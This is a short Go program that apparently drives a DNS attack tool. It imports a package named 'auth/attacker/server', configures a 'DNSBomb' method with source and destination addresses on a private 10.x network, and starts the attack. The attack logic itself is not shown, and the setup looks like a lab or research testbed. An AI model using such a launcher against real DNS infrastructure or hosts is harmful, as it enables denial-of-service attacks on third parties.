package main

import (
	"auth/attacker/server"
)

func main() {
	attack := server.Server{
		Method:         "DNSBomb",
		SrcIP:           "10.151.0.71", 
		DstIP:           "10.152.0.71",     
	}
	attack.Start()
}
